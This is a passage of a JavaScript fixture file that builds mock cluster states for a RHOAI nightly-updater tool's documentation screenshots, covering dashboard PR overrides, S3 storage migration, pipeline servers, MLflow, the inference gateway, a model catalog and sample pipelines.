      Object.assign(comp, {
        status: "NotReady",
        message: "Module status is stale (observedGeneration < generation)",
        cause: "Its module operator has not reconciled the current spec yet",
      });
    }
  }
  return c;
}

// --- Dashboard Dev (PR overrides) -----------------------------------------------

const dashImage = (container, env, repo) => {
  const release = `registry.redhat.io/rhoai/odh-${container}-rhel9@${digest(`release-${container}`)}`;
  return { deployment: "rhods-dashboard", container, envVar: env, repository: repo, defaultImage: release, baselineImage: release };
};

export function dashboardIdle() {
  const images = [
    dashImage("rhods-dashboard", "RELATED_IMAGE_ODH_DASHBOARD_IMAGE", "opendatahub/odh-dashboard"),
    dashImage("model-registry-ui", "RELATED_IMAGE_ODH_MOD_ARCH_MODEL_REGISTRY_IMAGE", "opendatahub/odh-mod-arch-modular-architecture"),
    dashImage("gen-ai-ui", "RELATED_IMAGE_ODH_MOD_ARCH_GEN_AI_IMAGE", "opendatahub/odh-mod-arch-gen-ai"),
    dashImage("maas-ui", "RELATED_IMAGE_ODH_MOD_ARCH_MAAS_IMAGE", "opendatahub/mod-arch-maas"),
  ].map((i) => ({ ...i, currentImage: i.defaultImage, ready: true, matchesTarget: false, running: "release" }));
  return {
    operatorAvailable: true, operatorPaused: false, isDevMode: false, devImages: images, allDevImagesReady: true,
    devImagesMatchTarget: false, defaultImagesRestored: true, currentImage: images[0].currentImage, deploymentMode: "operator",
    isCustomPR: false, managed: true, podStatus: "Running", podReady: true, containersReady: 5, containersTotal: 5,
    rolloutPending: false, canAssistRollout: false, dashboardURL: DASHBOARD_URL,
    override: { active: false, operatorPaused: false, sessionRecorded: false, stale: false, dashboardDeleting: false },
    defaultFlavor: "rhoai", availableFlavors: ["rhoai", "odh"], rolloutStuck: false,
  };
}

/** Active session: dev-user deployed PR #5123 (RHOAI Konflux) 40 minutes ago. */
export function dashboardSession() {
  const s = dashboardIdle();
  const pr = 5123;
  s.devImages = s.devImages.map((i) => {
    const hasBuild = i.container === "rhods-dashboard" || i.container === "gen-ai-ui";
    const target = hasBuild ? `quay.io/${i.repository}:odh-pr-${pr}` : i.defaultImage;
    return {
      ...i, currentImage: target, targetImage: target, matchesTarget: true, ready: true,
      targetSource: hasBuild ? "pr" : "baseline", targetTag: hasBuild ? `odh-pr-${pr}` : undefined,
      running: hasBuild ? "pr" : "release", runningPR: hasBuild ? pr : undefined, flavor: hasBuild ? "rhoai" : undefined,
    };
  });
  Object.assign(s, {
    operatorPaused: true, isDevMode: true, devMode: "pr", isCustomPR: true, prNumber: pr, prContainers: ["rhods-dashboard", "gen-ai-ui"],
    devImagesMatchTarget: true, defaultImagesRestored: false, currentImage: s.devImages[0].currentImage, flavor: "rhoai",
  });
  s.override = {
    active: true, operatorPaused: true, sessionRecorded: true, mode: "pr", prNumber: pr, flavor: "rhoai",
    startedAt: ago(40), startedBy: USER, updatedAt: ago(40), updatedBy: USER,
    releaseVersionAtStart: "3.6.0", releaseVersion: "3.6.0", stale: false, dashboardDeleting: false,
    components: s.devImages.map((i) => ({ deployment: i.deployment, container: i.container, image: i.targetImage, source: i.targetSource, tag: i.targetTag })),
    lastAction: { action: "deploy-pr", by: USER, at: ago(40), detail: `PR #${pr} (RHOAI build)` },
  };
  return s;
}

/**
 * GET /api/dashboard/builds for dashboardSession(): rhods-dashboard tracks the PR
 * head; gen-ai-ui lags two commits; tag odh-pr-5123 already points at a newer image.
 */
export function dashboardBuilds(session = dashboardSession()) {
  const pr = session.prNumber;
  const repo = "opendatahub-io/odh-dashboard";
  const head = hex(`pr-${pr}-head`, 40);
  const older = hex(`pr-${pr}-older`, 40);
  const build = (i, commit) => ({
    deployment: i.deployment, container: i.container, image: i.currentImage, running: "pr", pr, flavor: "rhoai",
    commit, repo, commitURL: `https://github.com/${repo}/commit/${commit}`,
  });
  const host = session.devImages.find((i) => i.container === "rhods-dashboard");
  const genAI = session.devImages.find((i) => i.container === "gen-ai-ui");
  return {
    builds: [
      {
        ...build(host, head), buildDate: ago(55), commitDate: ago(70),
        divergence: { base: `pr-${pr}`, baseHead: head, status: "identical", behind: 0, ahead: 0, compareURL: `https://github.com/${repo}/compare/${head}...${head}`, prState: "open", prTitle: "Show the model deployment status in the project overview", checkedAt: ago(1) },
      },
      {
        ...build(genAI, older), buildDate: ago(60 * 5 + 10), commitDate: ago(60 * 5 + 30),
        divergence: { base: `pr-${pr}`, baseHead: head, status: "behind", behind: 2, ahead: 0, compareURL: `https://github.com/${repo}/compare/${older}...${head}`, prState: "open", prTitle: "Show the model deployment status in the project overview", checkedAt: ago(1) },
        newer: { image: `quay.io/${genAI.repository}:odh-pr-${pr}@${digest(`gen-ai-pr-${pr}-newer`)}`, tag: `odh-pr-${pr}`, commit: head, commitURL: `https://github.com/${repo}/commit/${head}`, buildDate: ago(50) },
      },
    ],
  };
}

// --- Environment (/test-resources fixtures) -------------------------------------

const SEAWEEDFS = `ghcr.io/chrislusf/seaweedfs@${digest("seaweedfs-4.54")}`;
const S3_UI = `https://seaweedfs-admin-seaweedfs.${APPS}`;
const BLOCKED = (ps) => `1 pipeline server uses this S3 storage: ${ps}. Delete it first.`;

export const s3States = {
  running: {
    deployed: true, ready: true, message: "Running", namespace: "seaweedfs", uiRoute: S3_UI, currentImage: SEAWEEDFS,
    managedByTool: true, dataPVCs: ["seaweedfs-data"], uiUser: "admin", namespaceDeletable: true, teardownBlockedReason: BLOCKED("dev-project/dspa"), usedBy: ["dev-project/dspa"],
  },
  incomplete: {
    deployed: true, ready: false, terminalError: true, namespace: "seaweedfs", currentImage: SEAWEEDFS, managedByTool: true, uiUser: "admin",
    dataPVCs: ["seaweedfs-data"],
    message: "Deployment seaweedfs is scaled to 0 replicas.",
    repairNeeded: "Deployment seaweedfs is scaled to 0 replicas.",
    teardownBlockedReason: BLOCKED("dev-project/dspa"), usedBy: ["dev-project/dspa"],
  },
  none: { deployed: false, ready: false, message: "Not deployed", namespace: "seaweedfs", managedByTool: false },
  starting: {
    deployed: true, ready: false, message: "0/1 ready", namespace: "seaweedfs", currentImage: SEAWEEDFS, managedByTool: true, uiUser: "admin",
    dataPVCs: ["seaweedfs-data"],
  },
  imagePull: {
    deployed: true, ready: false, terminalError: true, namespace: "seaweedfs", currentImage: "mirror.example.com/seaweedfs:4.54", managedByTool: true, uiUser: "admin",
    dataPVCs: ["seaweedfs-data"], waitingReason: "ImagePullBackOff",
    message: 'ImagePullBackOff: Back-off pulling image "mirror.example.com/seaweedfs:4.54": unauthorized',
  },
  // Pre-existing seaweedfs namespace from another actor: setup aborts.
  foreign: {
    deployed: false, ready: false, namespace: "seaweedfs", managedByTool: false,
    message: "Namespace seaweedfs exists but was not created by this tool, so setup will not modify it.",
    setupBlockedReason: "Namespace seaweedfs exists but was not created by this tool, so setup will not modify it.",
    teardownBlockedReason: "Namespace seaweedfs was not created by this tool.",
  },
  // Legacy minio bucket remains while seaweedfs is empty, or—during stage
  // "remove"—new storage is already live.
  migrationNeeded: {
    deployed: false, ready: false, message: "Not deployed", namespace: "seaweedfs", managedByTool: false, migrationPending: true,
    teardownBlockedReason: BLOCKED("dev-project/dspa"), usedBy: ["dev-project/dspa"],
  },
  migrated: {
    deployed: true, ready: true, message: "Running", namespace: "seaweedfs", uiRoute: S3_UI, currentImage: SEAWEEDFS,
    managedByTool: true, dataPVCs: ["seaweedfs-data"], uiUser: "admin", migrationPending: true, teardownBlockedReason: BLOCKED("dev-project/dspa"), usedBy: ["dev-project/dspa"],
  },
};

/** Legacy dspa pipeline server from an older release, still on minio storage. */
export const legacyPipelineServer = {
  deployed: true, ready: true, message: "Running", namespace: "dev-project", name: "dspa", managedByTool: true,
  apiRoute: `https://ds-pipeline-dspa-dev-project.${APPS}`, uiRoute: `${DASHBOARD_URL}/develop-train/pipelines/definitions/dev-project`, dataPVCs: ["mariadb-dspa"],
};

/** Residual minio objects after 2.1→2.3 (pkg/types LegacyStorageState). */
export function legacyStorage(stage) {
  return {
    namespace: "minio", server: "SeaweedFS", ready: true, endpoint: "minio-service.minio.svc:9000",
    objects: ["Deployment seaweedfs", "NetworkPolicy seaweedfs-ingress", "Route minio-ui", "Service minio-service", "Secret minio-secret", "PersistentVolumeClaim seaweedfs-pvc", "PersistentVolumeClaim minio-pvc"],
    dataPVCs: [{ name: "seaweedfs-pvc", size: "20Gi" }, { name: "minio-pvc", size: "20Gi" }],
    uncopiedPVCs: ["minio-pvc"],
    usedBy: stage === "migrate" ? ["dev-project/dspa"] : [],
    stage,
    repoint: stage === "migrate" ? ["dev-project/dspa"] : [],
    namespaceDeletable: true,
  };
}

/** Progress events for storage migration (pkg/cluster MigrateS3Storage). */
export function migrateSteps(kind) {
  const rows = kind === "migrate"
    ? [
      ["check", "running", "Checking the storage in namespace minio"],
      ["check", "success", "OK: SeaweedFS in namespace minio is running"],
      ["storage", "running", "Setting up the storage in namespace seaweedfs with new keys"],
      ["storage", "success", "OK: The new storage is ready"],
      ["copy", "running", "Copying every bucket and object from minio to 'seaweedfs' (Job seaweedfs-migrate)"],
      ["copy", "success", "OK: 37 objects (18204511 bytes) copied and checked byte for byte"],
      ["repoint", "running", "Moving pipeline server dev-project/dspa"],
      ["repoint", "success", "OK: 1 pipeline server moved"],
      ["operation_complete", "success", "Migrated 37 objects (18204511 bytes) to namespace seaweedfs. 1 pipeline server now uses it: dev-project/dspa. The old storage in namespace minio is kept: delete it later from the S3 storage's menu, once nothing else uses it."],
    ]
    : [
      ["check", "success", "OK: Nothing of this tool uses the old storage"],
      ["copy", "running", "Copying every bucket and object from minio to 'seaweedfs' (Job seaweedfs-migrate)"],
      ["copy", "success", "OK: 37 objects (18204511 bytes) copied and checked byte for byte"],
      ["remove", "running", "Deleting the old storage in namespace minio"],
      ["remove", "success", "OK: The old storage is deleted"],
      ["namespace", "success", "OK: Namespace minio is being deleted, with everything else in it"],
      ["operation_complete", "success", "The old storage in namespace minio was removed; its 37 objects (18204511 bytes) are in namespace seaweedfs. Namespace minio is being deleted, with everything else in it."],
    ];
  return rows.map(([step, status, message]) => ({ step, status, message }));
}

export const pipelineServer = {
  deployed: true, ready: true, message: "Running", namespace: "dev-project", name: "dspa", managedByTool: true,
  apiRoute: `https://ds-pipeline-dspa-dev-project.${APPS}`, uiRoute: `${DASHBOARD_URL}/develop-train/pipelines/definitions/dev-project`, dataPVCs: ["mariadb-dspa"],
  connection: "rhoai-nightly-updater-s3", connectionState: "present",
};

/** Renamed nightly-dspa server from an earlier tool (pkg/types NonStandardName); UI offers Recreate. */
export const pipelineServerOldName = {
  ...pipelineServer, name: "nightly-dspa", nonStandardName: true, connection: undefined, connectionState: "missing",
  apiRoute: `https://ds-pipeline-nightly-dspa-dev-project.${APPS}`, dataPVCs: ["mariadb-nightly-dspa"],
};

/** Dashboard-created pipeline server outside tool ownership (pkg/types UnmanagedPipelineServers). */
export const foreignPipelineServer = {
  deployed: true, ready: true, message: "Running", namespace: "fraud-detection", name: "dspa", managedByTool: false,
  uiRoute: `${DASHBOARD_URL}/develop-train/pipelines/definitions/fraud-detection`,
  teardownBlockedReason: "This pipeline server was not created by this tool, so the tool will not delete it.",
};

/** Pipeline server mid-bootstrap while DSPO warms workloads. */
export const pipelineServerStarting = { ...pipelineServer, ready: false, message: "Starting (1/3 ready)", uiRoute: undefined };

/** Tool-managed dspa clone relocated to namespace ns. */
export const pipelineServerIn = (ns, over = {}) => ({
  ...pipelineServer, namespace: ns, apiRoute: pipelineServer.apiRoute.replace("dev-project", ns), uiRoute: pipelineServer.uiRoute.replace("dev-project", ns), ...over,
});

/** Stuck server past dspaStuckAfter (pkg/cluster pipeline_server.go) including Ready condition text. */
export const pipelineServerStuck = (ns) => pipelineServerIn(ns, {
  ready: false, terminalError: true, uiRoute: undefined, apiRoute: undefined,
  message: "Deployment ds-pipeline-dspa: 0/1 replicas available (database connection refused)",
});

export const mlflowStates = {
  none: { deployed: false, ready: false, message: "Not deployed", managedByTool: false },
  // Dashboard-provisioned MLflow the tool must not tear down.
  foreign: {
    deployed: true, ready: true, message: "Running", namespace: "redhat-ods-applications", name: "mlflow", managedByTool: false,
    uiRoute: `https://data-science-gateway.${APPS}/mlflow`, currentImage: `registry.redhat.io/rhoai/odh-mlflow-rhel9@${digest("mlflow")}`,
    teardownBlockedReason: "This MLflow instance was not created by this tool, so the tool will not delete it.",
  },
  foreignBroken: {
    deployed: true, ready: false, terminalError: true, message: "CrashLoopBackOff", waitingReason: "CrashLoopBackOff", namespace: "redhat-ods-applications", name: "mlflow",
    managedByTool: false, currentImage: `registry.redhat.io/rhoai/odh-mlflow-rhel9@${digest("mlflow")}`,
    teardownBlockedReason: "This MLflow instance was not created by this tool, so the tool will not delete it.",
  },
  // MLflow pinned to an unpullable PR image.
  prBroken: {
    deployed: true, ready: false, terminalError: true, message: "ImagePullBackOff", waitingReason: "ImagePullBackOff", namespace: "redhat-ods-applications", name: "mlflow",
    managedByTool: true, prOverride: true, prNumber: 412, revertImage: "", currentImage: `quay.io/opendatahub/mlflow@${digest("mlflow-pr-412")}`, dataPVCs: ["mlflow-pvc"],
  },
  running: {
    deployed: true, ready: true, message: "Running", namespace: "redhat-ods-applications", name: "mlflow", managedByTool: true,
    uiRoute: `https://data-science-gateway.${APPS}/mlflow`, currentImage: `registry.redhat.io/rhoai/odh-mlflow-rhel9@${digest("mlflow")}`,
    dataPVCs: ["mlflow-pvc"],
  },
};

export const projects = ["dev-project", "fraud-detection", "llm-eval"];

// --- Models (pkg/types InferenceGatewayState, ModelsStatus, ModelState) ---
// Copy follows pkg/cluster inference_gateway.go and models.go.
const INFERENCE = `https://inference.${APPS}`;
const PRESET = "v3-6-0-kserve-config-llm-template-cpu";
const PRESET_IMAGE = `registry.redhat.io/rhaii/vllm-cpu-rhel9@${digest("vllm-cpu-nightly")}`;
const RELEASED_IMAGE = `registry.redhat.io/rhaii/vllm-cpu-rhel9@${digest("vllm-cpu-3.5.3")}`;
// Gateway allowedProjects mirrors allowedRoutes (kubernetes.io/metadata.name In
// [...], RHOAI docs): openshift-ingress plus every project hosting a model.
const ALLOWED = ["openshift-ingress", "a-test-project", "dev-project", "fraud-detection", "llm-eval"];
const GW = { namespace: "openshift-ingress", name: "openshift-ai-inference", allowedProjects: ALLOWED };
const usedBy = (models) => models.length
  ? { usedBy: models, teardownBlockedReason: `Models route through it: ${models.join(", ")}. Delete ${models.length > 1 ? "those models" : "that model"} first.` }
  : {};

export const gatewayStates = {
  none: { deployed: false, ready: false, message: "Not set up", managedByTool: false },
  starting: { ...GW, deployed: true, ready: false, managedByTool: true, message: "Programmed, waiting for an address", externalUrl: INFERENCE },
  ready: (models = []) => ({ ...GW, deployed: true, ready: true, managedByTool: true, message: "Running", externalUrl: INFERENCE, address: "a1b2c3d4e5f6-1234567890.us-east-1.elb.amazonaws.com", dns: "published", addedProjects: models.length ? ["dev-project"] : undefined, authPolicy: models.length ? "enforced" : "missing", ...usedBy(models) }),
  // Pre-existing gateway from chart/admin: fixture leaves it untouched.
  // allowedRoutes in chart docs is simply project names.
  foreign: (models = []) => ({ ...GW, allowedProjects: ["openshift-ingress", "llm-eval"], deployed: true, ready: true, managedByTool: false, message: "Running", externalUrl: INFERENCE, address: "a9f8e7d6-0987654321.us-east-1.elb.amazonaws.com", authPolicy: "enforced", ...usedBy(models), teardownBlockedReason: "This gateway was not created by this tool, so the tool does not change or delete it." }),
  // Dashboard-deployed models in unlisted namespaces hit notAllowedModels when
  // routes would cross the gateway.
  notAllowed: (gw, models) => ({ ...gw, allowedProjects: gw.allowedProjects.filter((p) => !models.some((m) => m.startsWith(`${p}/`))),
    notAllowedModels: models, notAllowedModelProjects: [...new Set(models.map((m) => m.split("/")[0]))] }),
  // Foreign gateway lacking Programmed: treat health as unknown, not failed.
  unknown: { ...GW, deployed: true, ready: false, managedByTool: false, healthUnknown: true, message: "Reports no Programmed condition", externalUrl: INFERENCE, teardownBlockedReason: "This gateway was not created by this tool, so the tool does not change or delete it." },
};

/** Catalog entries aligned with pkg/cluster modelCatalog. */
export const MODEL_CATALOG = [
  { name: "smollm2-135m-instruct", displayName: "SmolLM2 135M Instruct (CPU)", uri: "hf://HuggingFaceTB/SmolLM2-135M-Instruct:12fd25f77366fa6b3b4b768ec3050bf629380bac", cpu: "2", memoryRequest: "4Gi", memory: "5Gi",
    type: "chat", useCase: "Chat (smoke test)", downloadSize: "270 MB", args: "--max-model-len 4096 --enable-force-include-usage",
    description: "A very small chat model, for checking that model serving works. From Hugging Face (HuggingFaceTB/SmolLM2-135M-Instruct), served by vLLM on CPU. Set up by rhoai-nightly-updater." },
  { name: "qwen25-05b-instruct", displayName: "Qwen2.5 0.5B Instruct (CPU)", uri: "hf://Qwen/Qwen2.5-0.5B-Instruct:7ae557604adf67be50417f59c2c2f167def9a775", cpu: "4", memoryRequest: "6Gi", memory: "8Gi",
    type: "chat", useCase: "Chat", downloadSize: "1.0 GB", args: "--max-model-len 4096 --enable-force-include-usage", default: true,
    description: "A small chat model. From Hugging Face (Qwen/Qwen2.5-0.5B-Instruct), served by vLLM on CPU. Set up by rhoai-nightly-updater." },
  { name: "qwen3-1-7b", displayName: "Qwen3 1.7B (CPU, tool calling)", uri: "hf://Qwen/Qwen3-1.7B:70d244cc86ccca08cf5af4e1e306ecf908b1ad5e", cpu: "4", memoryRequest: "12Gi", memory: "14Gi",
    type: "chat", toolCalling: true, useCase: "Chat, Tool calling, Reasoning", downloadSize: "4.1 GB",
    args: `--max-model-len 4096 --enable-auto-tool-choice --tool-call-parser hermes --reasoning-parser qwen3 --default-chat-template-kwargs '{"enable_thinking":false}' --enable-force-include-usage`,
    description: "A chat model that can call tools; its reasoning (thinking) is off unless a request turns it on. From Hugging Face (Qwen/Qwen3-1.7B), served by vLLM on CPU. Set up by rhoai-nightly-updater." },
  { name: "granite-embedding-125m-english", displayName: "Granite Embedding 125M English (CPU)", uri: "hf://ibm-granite/granite-embedding-125m-english:4ab61ffd423be45cd932b21a7c696063d82bf45f", cpu: "2", memoryRequest: "3Gi", memory: "4Gi",
    type: "embedding", embeddingDimension: 768, useCase: "Embeddings, Semantic search", downloadSize: "250 MB", args: "--runner pooling --max-model-len 512",
    description: "An English embedding model (768 dimensions) for semantic search. From Hugging Face (ibm-granite/granite-embedding-125m-english), served by vLLM on CPU. Set up by rhoai-nightly-updater." },
];
const displayOf = (name) => MODEL_CATALOG.find((c) => c.name === name)?.displayName ?? name;

const MODEL = { name: "qwen25-05b-instruct", displayName: "Qwen2.5 0.5B Instruct (CPU)", deployed: true };
export const modelStates = {
  ready: (ns = "dev-project", over = {}) => ({ ...MODEL, namespace: ns, ready: true, managedByTool: true, message: "Running", url: `${INFERENCE}/${ns}/${over.name ?? MODEL.name}`, imageKind: "preset", hardwareProfile: "redhat-ods-applications/default-profile",
    // Per-model SA/token secrets the tool provisions (pkg/cluster models_token.go).
    tokenSecret: `default-name-${over.name ?? MODEL.name}-sa`, tokenServiceAccount: `${over.name ?? MODEL.name}-sa`, ...over }),
  /** Alternate catalog entry on the released CPU image (nightly cluster uses shipping bits). */
  readyAs: (name, ns = "dev-project") => modelStates.ready(ns, { name, displayName: displayOf(name), imageKind: "released", imageVersion: "3.5.3", currentImage: RELEASED_IMAGE,
    hardwareProfile: name === "qwen3-1-7b" ? undefined : "redhat-ods-applications/default-profile" }),
  startingAs: (name, ns = "dev-project") => ({ ...MODEL, name, displayName: displayOf(name), namespace: ns, ready: false, managedByTool: true, message: `MainWorkloadReady: Deployment ${name}-kserve is not ready`, imageKind: "released" }),
  released: (ns = "dev-project") => modelStates.ready(ns, { imageKind: "released", imageVersion: "3.5.3", currentImage: RELEASED_IMAGE }),
  starting: (ns = "dev-project") => ({ ...MODEL, namespace: ns, ready: false, managedByTool: true, message: "MainWorkloadReady: Deployment qwen25-05b-instruct-kserve is not ready", imageKind: "preset" }),
  imageMissing: (ns = "dev-project") => ({
    ...MODEL, namespace: ns, ready: false, managedByTool: true, terminalError: true, presetImageMissing: true, imageKind: "preset", currentImage: undefined,
    hardwareProfile: "redhat-ods-applications/default-profile", tokenSecret: "default-name-qwen25-05b-instruct-sa", tokenServiceAccount: "qwen25-05b-instruct-sa",
    waitingReason: "ErrImagePull", message: `ErrImagePull: reading manifest ${PRESET_IMAGE.split("@")[1]} in registry.redhat.io/rhaii/vllm-cpu-rhel9: manifest unknown`,
  }),
  foreign: (ns = "llm-eval") => ({ ...MODEL, displayName: "Qwen (team copy)", namespace: ns, ready: false, managedByTool: false, healthUnknown: true, message: "Reports no Ready condition", teardownBlockedReason: "This model was not created by this tool (for example in the dashboard), so the tool does not change or delete it." }),
};

export const modelsStatus = (over = {}) => {
  const out = {
    dependencies: "True", preset: PRESET, imagePlan: "released",
    imagePlanReason: "This cluster runs a nightly RHOAI build, whose preset names an image that Red Hat has not published yet, and no mirror set serves registry.redhat.io/rhaii/vllm-cpu-rhel9; the newest released Red Hat image is used instead.",
    catalog: MODEL_CATALOG,
    items: [],
    ...over,
  };
  // addModelRouting fills reachability; items without exposure inherit KServe's
  // default gateway—the pre-4.0.0 behavior.
  out.items = out.items.map((i) => (i && i.deployed && !i.exposure ? routed(i) : i));
  return out;
};

/** Capacity warning text for a catalog row (pkg/cluster roomWarning). */
export const CAPACITY_WARNING = "No worker seems to have room for the model: it needs 4 CPUs and 12 GiB of memory free (up to 14 GiB); the worker with the most free CPU, ip-10-0-1-23.ec2.internal, has 5.5 CPUs and 8.2 GiB free.";
/** MODEL_CATALOG clone attaching the warning to Qwen3. */
export const catalogWithoutRoom = (name = "qwen3-1-7b") => MODEL_CATALOG.map((c) => (c.name === name ? { ...c, capacityWarning: CAPACITY_WARNING } : c));

// --- Samples (pkg/types SampleStatus, MLflowSamplesStatus, PipelineSampleSpec) ---
// Labels, UX strings, and actions come from pkg/cluster samples_*.go.

const SAMPLE_MARKER = "rhoai-nightly-updater.sample";
export const SAMPLE_NAMES = {
  "genai-demo": "Agent and prompt demo",
  training: "Training experiment and registered model",
  "mcp-server": "MCP server",
  skill: "Agent skill",
};
export const SAMPLE_IDS = Object.keys(SAMPLE_NAMES);
const DEMO_REMOVE_HINT = "To remove the demo, delete it in the MLflow UI. This tool does not remove it, and Clean up leaves it in place.";
const mlflowLink = (project, id) => `https://data-science-gateway.${APPS}/mlflow/#/experiments/${id}?workspace=${encodeURIComponent(project)}`;

/** Single sample row for a project/state combo per GetMLflowSamplesStatus. */
export function sampleStatus(project, id, state, extra = {}) {
  const s = { id, name: SAMPLE_NAMES[id], state, actions: [] };
  const foreign = { "genai-demo": "", training: "Experiment 'nightly-sample-training'", "mcp-server": "MCP server 'com.deepwiki/rhoai-nightly-sample'", skill: "Skill 'nightly-sample-mcp-builder'" }[id];
  switch (state) {
    case "absent":
      s.actions = ["add"];
      break;
    case "removed":
      s.actions = ["add"];
      s.message = id === "genai-demo" ? "Removed in MLflow: Add restores the experiment and generates every feature again." : "Removed: the experiment is in MLflow's deleted view. Add restores it.";
      break;
    case "present":
      if (id === "genai-demo") { s.actions = ["regenerate"]; s.message = DEMO_REMOVE_HINT; s.link = mlflowLink(project, 4); }
      else s.actions = ["remove"];
      if (id === "training") s.link = mlflowLink(project, 7);
      if (id === "mcp-server") s.message = "Points at https://mcp.deepwiki.com/mcp; the playground needs internet access to call it.";
      if (id === "skill") s.message = "Registers https://github.com/anthropics/skills (skills/mcp-builder at e4bb5d960d87); the dashboard's Skills page needs the skillRegistry feature flag.";
      break;
    case "partial":
      if (id === "genai-demo") { s.actions = ["regenerate"]; s.missing = ["evaluation", "issues"]; s.message = "An earlier Add or Regenerate did not finish; Regenerate completes it."; s.link = mlflowLink(project, 4); }
      else if (id === "training") { s.actions = ["add", "remove"]; s.missing = ["registered model"]; s.link = mlflowLink(project, 7); }
      else if (id === "mcp-server") { s.actions = ["add", "remove"]; s.missing = ["endpoint"]; }
      else { s.actions = ["add", "remove"]; s.missing = ["version"]; }
      break;
    case "foreign":
      s.message = id === "genai-demo"
        ? "Experiment 'MLflow Demo' holds MLflow's demo, made in the MLflow UI or by someone else, not by this tool. Regenerating it deletes traces and evaluations in that experiment, whoever logged them, so this tool leaves it alone: regenerate or delete it in the MLflow UI."
        : `${foreign} exists but was not created by this tool (it lacks the ${SAMPLE_MARKER} tag), so it is left unchanged.`;
      break;
    case "unsupported":
      s.message = id === "skill" ? "This MLflow has no Skill Registry." : "This MLflow has no MCP Server Registry.";
      break;
    case "unknown":
      s.message = "Cannot read the sample's state: MLflow answered 503 Service Unavailable.";
      break;
  }
  return { ...s, ...extra };
}

/** Demo blocked by legacy 2Gi MLflow limits from older tool builds (pkg/cluster demoStatus). */
export const DEMO_LOW_MEMORY = {
  message: "MLflow still has the 2Gi memory limit an earlier version of this tool set, and generating the demo runs MLflow out of memory. Add or Regenerate first removes that limit (spec.resources of MLflow CR mlflow, so the operator's defaults of 4 CPU / 3Gi apply) and MLflow restarts; then add the demo again once MLflow is ready.",
  repair: "MLflow CR mlflow: spec.resources (requests 500m/1Gi, limits 2/2Gi, set by an earlier version of this tool) is removed, so the operator's defaults (limits 4 CPU / 3Gi) apply. MLflow restarts, and the demo is not generated in this run: add it again once MLflow is ready.",
};
export const DEMO_LOW_MEMORY_FOREIGN = "MLflow's memory limit is 2Gi (spec.resources of MLflow CR mlflow), and generating the demo runs MLflow out of memory. This tool did not create that MLflow, so it does not change the limit: raise it, or remove spec.resources so the operator's defaults (3Gi) apply.";

/** Project-level MLflow sample map; omitted ids default to absent. */
export const mlflowSamples = (project, states = {}) => ({
  project, available: true, mlflowURL: `https://data-science-gateway.${APPS}/mlflow`,
  samples: SAMPLE_IDS.map((id) => sampleStatus(project, id, states[id] || "absent")),
});

export const SAMPLE_PIPELINE_IMAGE = `registry.access.redhat.com/ubi9/ubi-minimal@${digest("ubi9-minimal")}`;
/** Pipeline sample YAML for GET /api/resources/samples/pipeline/spec (pkg/cluster PipelineSampleSpec). */
export const pipelineSampleSpec = {
  name: "rhoai-nightly-sample", fileName: "rhoai-nightly-sample.yaml",
  description: "Sample created by rhoai-nightly-updater: a two-step pipeline that writes an artifact and reads it back.",
  image: SAMPLE_PIPELINE_IMAGE,
  yaml: `components:
    comp-read-artifact:
        executorLabel: exec-read-artifact
        inputDefinitions:
            artifacts:
                greeting:
                    artifactType:
                        schemaTitle: system.Artifact
                        schemaVersion: 0.0.1
    comp-write-artifact:
        executorLabel: exec-write-artifact
        outputDefinitions:
            artifacts:
                greeting:
                    artifactType:
                        schemaTitle: system.Artifact
                        schemaVersion: 0.0.1
deploymentSpec:
    executors:
        exec-read-artifact:
            container:
                args:
                    - echo "Read $0:" && cat "$0"
                    - '{{$.inputs.artifacts[''greeting''].path}}'
                command:
                    - sh
                    - -c
                image: ${SAMPLE_PIPELINE_IMAGE}
        exec-write-artifact:
            container:
                args:
                    - mkdir -p "$(dirname "$0")" && echo "Hello from the rhoai-nightly-updater sample pipeline" > "$0" && echo "Wrote $0"
                    - '{{$.outputs.artifacts[''greeting''].path}}'
                command:
                    - sh
                    - -c
                image: ${SAMPLE_PIPELINE_IMAGE}
pipelineInfo:
    description: 'Sample created by rhoai-nightly-updater: a two-step pipeline that writes an artifact and reads it back.'
    name: rhoai-nightly-sample
root:
    dag:
        tasks:
            read-artifact:
                cachingOptions: {}
                componentRef:
                    name: comp-read-artifact
                dependentTasks:
                    - write-artifact
                inputs:
                    artifacts:
                        greeting:
                            taskOutputArtifact:
                                outputArtifactKey: greeting
                                producerTask: write-artifact
                taskInfo:
                    name: read-artifact
            write-artifact:
                cachingOptions: {}
                componentRef:
                    name: comp-write-artifact
                taskInfo:
                    name: write-artifact
schemaVersion: 2.1.0
sdkVersion: kfp-2.13.0
`,
};

// --- Versions and self-update probe --------------------------------------------

// Docs UI version tracks the repo, not stale image tags: parse CHANGELOG.md's
// first X.Y.Z heading (skip Unreleased like scripts/release.sh changelog_top)
// and deploy/template.yaml TEMPLATE_REVISION. Chart.yaml appVersion is ignored
// because pre-release values (e.g. v5.0.0-alpha.2) would stick in containers
// past GA.
const repoRoot = join(here, "..", "..", "..");

function docsVersion() {
  for (const line of readFileSync(join(repoRoot, "CHANGELOG.md"), "utf8").split("\n")) {
    const m = line.match(/^## \[([^\]]+)\]/);
    if (!m || m[1].toLowerCase() === "unreleased") continue;
    if (!/^\d+\.\d+\.\d+$/.test(m[1])) throw new Error(`CHANGELOG.md: the top section's version "${m[1]}" is not X.Y.Z`);
    return `v${m[1]}`;
  }
  throw new Error("CHANGELOG.md has no \"## [X.Y.Z]\" section");
}

function templateRevision() {
  const m = readFileSync(join(repoRoot, "deploy", "template.yaml"), "utf8").match(/name: TEMPLATE_REVISION\s*\n\s*value: *"?([^"\s]+)"?/);
  if (!m) throw new Error("deploy/template.yaml has no TEMPLATE_REVISION");
  return m[1];
}

export const DOCS_VERSION = docsVersion();
export const TEMPLATE_REVISION = templateRevision();

// buildDate sits one day before screenshot NOW, consistent with other fixtures.
export const versionInfo = (overrides = {}) => ({
  version: DOCS_VERSION, commit: hex(DOCS_VERSION, 40), buildDate: ago(60 * 24), goVersion: "go1.25.1",
  templateRevision: TEMPLATE_REVISION, expectedTemplateRevision: TEMPLATE_REVISION, templateOutdated: false, ...overrides,
});

export const noUpdate = { current: DOCS_VERSION, latest: DOCS_VERSION, updateAvailable: false, majorUpgrade: false };

// --- Diagnostics (JSON snapshots) ----------------------------------------------

/** Load a diagnostics JSON fixture generated via make docs-fixtures. */
export function diagnostics(name) {
  return JSON.parse(readFileSync(join(here, "diagnostics", `${name}.json`), "utf8"));
}

// --- Update progress (streamed UpdateStep events) -----------------------------

/** GitOps-driven install where Argo CD owns the operator—full step list. */
export function gitOpsUpdateSteps(image) {
  return [
    ["validate_prerequisites", "running", "Checking prerequisites"],
    ["validate_prerequisites", "running", "Verifying the selected catalog image"],
